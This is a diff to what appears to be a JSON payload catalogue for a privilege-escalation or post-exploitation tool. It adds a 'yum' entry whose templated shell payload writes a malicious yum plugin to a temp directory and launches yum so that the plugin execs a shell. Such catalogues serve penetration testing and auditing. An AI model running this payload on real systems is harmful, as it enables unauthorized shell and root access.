@@ -2095,8 +2095,13 @@
 		}
 	],
 //-------------------------------------------------------------------
-// `yum` should be added.
-// https://gtfobins.github.io/gtfobins/yum/
+	"yum": [
+		{
+			"type": "shell",
+			"payload": "TF=$({mktemp} -d); {cat} >$TF/x<<EOF\n[main]\nplugins=1\npluginpath=$TF\npluginconfpath=$TF\nEOF\n\n{cat} >$TF/y.conf<<EOF\n[main]\nenabled=1\nEOF\n\n{cat} >$TF/y.py<<EOF\nimport os\nimport yum\nfrom yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE\nrequires_api_version='2.1'\ndef init_hook(conduit):\n    os.execl('{shell}','{shell}')\nEOF\n\n{command} -c $TF/x --enableplugin=y",
+			"args": []
+		}
+	],
 //-------------------------------------------------------------------
 	"zip": [
 		{
